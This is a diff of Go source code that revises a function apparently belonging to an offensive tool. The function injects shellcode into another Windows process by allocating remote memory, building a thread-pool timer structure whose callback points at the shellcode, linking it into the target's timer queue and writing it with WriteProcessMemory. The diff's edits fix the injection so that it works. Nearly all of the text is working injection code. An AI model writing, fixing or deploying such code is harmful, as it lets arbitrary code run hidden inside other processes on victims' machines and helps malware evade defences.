@@ -928,14 +928,12 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	output += "[+] Created TP_TIMER structure associated with shellcode\n"
 
 	// Step 7: Allocate memory for TP_TIMER in target process first (we need the address for linkage)
-	var tpTimerSize uintptr
-	var dummyTimer FULL_TP_TIMER
-	tpTimerSize = unsafe.Sizeof(dummyTimer)
+	var tpTimer FULL_TP_TIMER
 	
 	tpTimerAddr, _, err := procVirtualAllocEx.Call(
 		uintptr(hProcess),
 		0,
-		tpTimerSize,
+		uintptr(unsafe.Sizeof(tpTimer)),
 		uintptr(MEM_COMMIT|MEM_RESERVE),
 		uintptr(PAGE_READWRITE),
 	)
@@ -944,43 +942,46 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += fmt.Sprintf("[+] Allocated TP_TIMER memory at: 0x%X\n", tpTimerAddr)
 
-	// Step 8: Modify TP_TIMER structure directly (SafeBreach modifies the local pointer, not a copy)
+	// Step 8: Copy the TP_TIMER structure (CreateThreadpoolTimer may return protected memory)
+	for i := 0; i < int(unsafe.Sizeof(tpTimer)); i++ {
+		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpTimer)) + uintptr(i))) =
+			*(*byte)(unsafe.Pointer(pTpTimer + uintptr(i)))
+	}
+
+	// Step 9: Modify TP_TIMER structure for insertion
 	const timeout int64 = -10000000 // 1 second in 100-nanosecond intervals (negative = relative)
 
-	// Access the timer structure through the pointer returned by CreateThreadpoolTimer
-	pTimer := (*FULL_TP_TIMER)(unsafe.Pointer(pTpTimer))
-	
 	// Set Pool pointer to target's TP_POOL
-	pTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
+	tpTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
 	
-	// CRITICAL: Manually set the Callback - CreateThreadpoolTimer doesn't always set this field
-	pTimer.Work.CleanupGroupMember.Callback = shellcodeAddr
+	// CRITICAL: Manually set the Callback - CreateThreadpoolTimer doesn't set this field
+	tpTimer.Work.CleanupGroupMember.Callback = shellcodeAddr
 
 	// Set timer expiration
-	pTimer.DueTime = timeout
-	pTimer.WindowStartLinks.Key = timeout
-	pTimer.WindowEndLinks.Key = timeout
+	tpTimer.DueTime = timeout
+	tpTimer.WindowStartLinks.Key = timeout
+	tpTimer.WindowEndLinks.Key = timeout
 
 	// Set up circular lists for WindowStart and WindowEnd Children
 	// Calculate remote addresses for the Window*Links.Children fields
-	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(pTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(pTimer.WindowStartLinks.Children))
-	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(pTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(pTimer.WindowEndLinks.Children))
+	remoteWindowStartChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks.Children))
+	remoteWindowEndChildrenAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks)) + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks.Children))
 
-	pTimer.WindowStartLinks.Children.Flink = remoteWindowStartChildrenAddr
-	pTimer.WindowStartLinks.Children.Blink = remoteWindowStartChildrenAddr
-	pTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
-	pTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr
+	tpTimer.WindowStartLinks.Children.Flink = remoteWindowStartChildrenAddr
+	tpTimer.WindowStartLinks.Children.Blink = remoteWindowStartChildrenAddr
+	tpTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
+	tpTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr
 
 	output += "[+] Modified TP_TIMER structure for insertion\n"
-	output += fmt.Sprintf("[*] Debug: Callback address in structure = 0x%X (expected shellcode at 0x%X)\n", pTimer.Work.CleanupGroupMember.Callback, shellcodeAddr)
-	output += fmt.Sprintf("[*] Debug: Pool address in structure = 0x%X (expected 0x%X)\n", pTimer.Work.CleanupGroupMember.Pool, workerFactoryInfo.StartParameter)
+	output += fmt.Sprintf("[*] Debug: Callback address in structure = 0x%X (expected shellcode at 0x%X)\n", tpTimer.Work.CleanupGroupMember.Callback, shellcodeAddr)
+	output += fmt.Sprintf("[*] Debug: Pool address in structure = 0x%X (expected 0x%X)\n", tpTimer.Work.CleanupGroupMember.Pool, workerFactoryInfo.StartParameter)
 
-	// Step 9: Write TP_TIMER to target process (write the local modified structure)
+	// Step 10: Write TP_TIMER to target process
 	ret, _, err = procWriteProcessMemory.Call(
 		uintptr(hProcess),
 		tpTimerAddr,
-		pTpTimer, // Write from the pointer CreateThreadpoolTimer returned
-		tpTimerSize,
+		uintptr(unsafe.Pointer(&tpTimer)),
+		uintptr(unsafe.Sizeof(tpTimer)),
 		uintptr(unsafe.Pointer(&bytesWritten)),
 	)
 	if ret == 0 {
@@ -1010,8 +1011,8 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset
 
 	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
-	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks))
-	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks))
+	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks))
+	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks))
 
 	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
 	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOffset, absoluteQueueOffset)
